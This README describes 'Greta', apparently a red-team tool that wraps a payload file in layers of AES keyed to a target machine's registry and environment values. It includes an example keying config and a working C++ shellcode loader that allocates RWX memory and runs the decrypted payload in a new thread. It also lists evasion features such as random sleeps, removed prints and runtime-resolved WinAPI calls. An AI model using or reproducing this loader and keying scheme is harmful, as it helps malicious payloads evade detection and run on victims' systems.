# Greta
This is supporting code for [Greta: Windows Crypto, and Recursive Keying](https://mez0.cc/posts/greta-windows-crypto-environmental-keys/). The _goal_ of this project was to see if there was any validity to recursively encrypting data multiple times with various Environmental Keys. As someone **<u>*terrible*</u>** at crypto, I think there are better ways to encrypt data with environmental components. However, Greta works by taking in a given file (dll, bin, pe, etc)  and a config file. An example config file can be seen here:

```json
{
    "registry": [
    {
        "Hive": "HKEY_LOCAL_MACHINE",
        "Path": "SOFTWARE\\\\MICROSOFT\\\\CRYPTOGRAPHY",
        "Key": "MachineGuid",
        "Value": "fa20973d-6aee-40fa-90ce-b3169646c414"
    },
    {
        "Hive": "HKEY_LOCAL_MACHINE",
        "Path": "SOFTWARE\\\\Microsoft\\\\NET Framework Setup\\\\NDP\\\\v4\\\\Full",
        "Key": "Version",
        "Value": "4.8.03761"
    }],
    "variable": [
    {
        "Variable": "PROCESSOR_REVISION",
        "Value": "2d07"
    },
    {
        "Variable": "USERDNSDOMAIN",
        "Value": "SHELBY.LOCAL"
    },
    {
        "Variable": "PROCESSOR_IDENTIFIER",
        "Value": "Intel64 Family 6 Model 45 Stepping 7, GenuineIntel"
    },
    {
        "Variable": "USERPROFILE",
        "Value": "C:\\Users\\tommy"
    }]
}
```

This data is then parsed, and the `Value` is used as a key for the AES Encryption. Once that is all done, a C++ file is produced which can be included, like so:

```c++
#include "greta.h"
#include <stdio.h>
#include <vector>
#include <windows.h>

int main()
{
	GRETA greta = Greta();

	if (!greta.bStatus)
	{
		return -1;
	}

	LPVOID pAddress = VirtualAlloc(nullptr, greta.payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	RtlMoveMemory(pAddress, greta.payload.data(), greta.payload.size());

	HANDLE hThread = CreateThread(nullptr, greta.payload.size(), (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);

	WaitForSingleObject(hThread, INFINITE);
	
	return 0;
}
```

For slightly more detail, see [Greta: Windows Crypto, and Recursive Keying](https://mez0.cc/posts/greta-windows-crypto-environmental-keys/). Below is the help for Greta:

```
usage: greta.py [-h] [--debug] [--no-prints] [--output OUTPUT] [--sleep SLEEP] input config

Convert environmental data to multiple layers of AES!

positional arguments:
  input            File to encrypt
  config           Config file to parse

optional arguments:
  -h, --help       show this help message and exit
  --debug          Enable debug prints in output file
  --no-prints      Remove all printfs
  --output OUTPUT  Output file
  --sleep SLEEP    Sleep for random time between 0 and arg (between "substantial ops")
```

All WinAPI functions are dynamically resolved, but the strings for the functions are still within the code. However, none of the strings for the decryption are present. They are all obtained from functions at runtime :dancer:

If this is something you end up using, feel free to help me make my C++ better because, at the moment, you may have a hernia reading the code (or just send a PR!).
